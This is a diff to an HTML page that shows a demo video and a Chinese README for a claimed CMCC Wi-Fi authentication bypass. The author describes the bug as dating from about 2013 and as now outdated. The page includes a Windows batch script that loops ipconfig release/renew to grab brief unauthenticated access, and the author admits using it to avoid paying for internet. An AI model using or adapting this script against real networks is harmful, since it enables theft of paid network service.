@@ -3,13 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Video</title>
+    <title>CMCC 认证绕过 POC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            padding: 20px;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin: auto;
+        }
+        h1 {
+            color: #333;
+        }
+        video {
+            width: 100%;
+            border-radius: 5px;
+        }
+        .github-badge {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .github-badge img {
+            width: 150px;
+        }
+        .readme {
+            text-align: left;
+            margin-top: 20px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
+        }
+        .readme pre {
+            background: #eee;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre;
+            word-wrap: normal;
+            max-width: 100%;
+            font-family: 'Courier New', monospace;
+        }
+        .readme img {
+            max-width: 100%;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .backup-link {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        .backup-link:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-<h2>CMCC Bypass PoC 演示视频</h2>
-<video controls width="720">
-    <source src="./poc-video.mp4" type="video/mp4">
-    您的浏览器不支持 HTML5 视频标签。
-</video>
+<div class="container">
+    <h1>CMCC 认证绕过 PoC 演示</h1>
+    <video controls>
+        <source src="./poc-video.mp4" type="video/mp4">
+        您的浏览器不支持 HTML5 视频。
+    </video>
+
+    <div class="github-badge">
+        <a href="https://github.com/wireless-sec/cmcc-bypass-poc" target="_blank">
+            <img src="https://img.shields.io/github/stars/wireless-sec/cmcc-bypass-poc?style=social" alt="GitHub repo">
+        </a>
+    </div>
+
+    <div class="readme">
+        <h2>README</h2>
+        <p><strong>CMCC认证绕过POC</strong></p>
+        <p>在此处备份一下大学的时候发现过的一个CMCC的漏洞，已经是一个过时的漏洞，谨以此纪念。</p>
+        <p>原理就是CMCC刚连接上去的时候会有一瞬间不需要认证就能上网（大概十年前，2013年左右的时候），所以就用脚本来一直不断的模拟连接、断开，试图去嫖那刚连接上一瞬间的流量积少成多，打开网页，看看视频啥的问题不大，我们几个屌丝靠这个洞渡过不少交不起网费的日子，哈哈哈。</p>
+
+        <p><strong>备份自：</strong><a href="https://www.cnblogs.com/cc11001100/p/8100247.html" class="backup-link" target="_blank">https://www.cnblogs.com/cc11001100/p/8100247.html</a></p>
+
+        <p>大学的时候无意间发现绕过CMCC验证的方法（贫穷使人进步...），写了段POC脚本，时过两年，漏洞应该已经失效了（我猜 --），刚刚发现有人私信问我要，都那么久了鬼还记得写的什么啊，但确实看到了又不能当做没看到，只好在以前电脑翻了一阵，想了一下，还是贴在这里备份一下，毕竟我也是发现过漏洞的男人....</p>
+
+        <p>作用为连接CMCC无需验证即上网，缺陷是这样得到的网络并不稳定，其实挺鸡肋的，语言为Windows下的脚本语言bat：</p>
+
+        <pre><code>@echo off
+title FREE LUNCH
+:loop
+
+    cls
+
+    REM 丧心病狂的转义符
+    ^e^c^h^o^.
+    ^e^c^h^o^ ^ ^ ^ ^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^.^-^~^~^~^~^-^.^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^/^ ^_^_^ ^ ^ ^ ^ ^\^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|^ ^/^ ^ ^\^ ^ ^/^ ^ ^`^~^~^~^~^~^-^.^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|^|^ ^ ^ ^ ^|^ ^ ^0^ ^ ^ ^ ^ ^ ^ ^ ^ ^@^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|^|^ ^ ^ ^ ^|^ ^ ^_^.^ ^ ^ ^ ^ ^ ^ ^ ^|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\^|^ ^ ^ ^ ^|^ ^ ^ ^\^ ^ ^ ^ ^ ^ ^ ^/^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\^ ^ ^ ^ ^/^ ^ ^/^`^~^~^~^~^~^~^`^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^(^'^-^-^'^"^"^`^)^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^/^`^"^"^"^"^"^`^\^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^假^装^世^界^很^美^好^，^然^后^为^之^奋^斗^ ^ ^ ^ ^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^-^-^-^-^-^-^-^-^ ^b^y^ ^c^c^ ^ ^ ^o
+    ^e^c^h^o^ ^ ^ ^ ^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o^-^o
+
+    REM the core code
+    ipconfig /release >> nul
+    ipconfig /renew >> nul
+    ping 127.0.0.1 -n 8 >> nul
+
+goto :loop
+
+REM hack by cc
+REM 2016-5-8 11:26:1</code></pre>
+
+        <img src="./784924-20171225010047444-823883121.png" alt="示例图片">
+    </div>
+</div>
 </body>
 </html>
